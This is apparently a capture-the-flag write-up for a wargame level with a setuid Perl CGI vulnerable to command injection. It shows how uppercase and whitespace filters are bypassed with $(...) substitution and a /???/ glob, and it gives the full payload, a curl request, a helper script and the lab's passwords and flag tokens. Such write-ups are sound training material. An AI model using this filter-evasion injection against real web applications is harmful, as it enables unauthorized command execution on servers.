# level12

Another Perl CGI shelling out to a command, except this one actually tries to filter your input. Keyword: it tries. Bless it :)

| | |
| --- | --- |
| **Login** | `level12` / `fa6v5ateaw21peobuub8ipe6s` (the flag11 token) |
| **flag12 password** | n/a (the CGI runs our command as flag12) |
| **flag12 token** | `g1qKMiRpXf53AWhDaU7FEkczr` (aka the level13 password) |

## poking around

Perl CGI, setuid flag12, served on `localhost:4646` (also under `/var/www/level12/`):

```perl
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;          # (1) uppercases everything
  $xx =~ s/\s.*//;             # (2) deletes from the first whitespace on
  @output = `egrep "^$xx" /tmp/xd 2>&1`;   # (3) our input, in a shell
  ...
}
n(t(param("x"), param("y")));
```

The `` `egrep "^$xx" ...` `` is the usual command injection, but filters (1) and (2) make it awkward:

- **No lowercase.** Everything a-z becomes A-Z, so we can't type `getflag`.
- **No spaces.** Anything from the first whitespace onward is chopped off.

And `$xx` sits inside double quotes (`"^$xx"`), so a bare `;` won't even break out.

## beating the filters

Three observations stack up into an exploit:

- **Command substitution works inside double quotes.** `"^$(...)"` still runs `...`. That gets us out of the quoted `egrep` pattern without needing to close the quote.
- **File contents aren't filtered, only the URL input is.** So put the lowercase `getflag` inside a script file and the uppercasing never touches it.
- **Glob characters survive.** `? * /` and digits aren't in a-z, so a wildcard path passes through untouched, and the shell expands it to the real (lowercase) filename at runtime.

So: drop a script named with digits only, and call it through a glob.

```sh
# lowercase lives in the file, which the filter never sees
printf '#!/bin/sh\ngetflag > /tmp/l12 2>&1\nchmod 666 /tmp/l12\n' > /tmp/0000
chmod +x /tmp/0000
```

`/tmp` has lowercase letters, so we can't type it either, but `/???/` is a 3-character-dir glob that matches it (and `0000` is unique enough that `/???/0000` expands to exactly our file).

The payload, start to finish, contains no lowercase and no spaces:

```
$(/???/0000)
```

Fire it:

```bash
$ curl -s -G http://localhost:4646/ --data-urlencode 'x=$(/???/0000)'
..
$ cat /tmp/l12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

`egrep` gets a nonsense pattern and the CGI prints its usual `..`, but `$(...)` already ran our script as flag12.

`pwn.sh` in this folder does all of it. It curls the CGI on the target's loopback, so run it there, from the toolbox:

```bash
scp -P 4242 ~/snowcrash/level12/resources/pwn.sh level12@10.0.2.2:/tmp/
ssh -p 4242 level12@10.0.2.2        # password: fa6v5ateaw21peobuub8ipe6s
# then on the target:
$ sh /tmp/pwn.sh
```
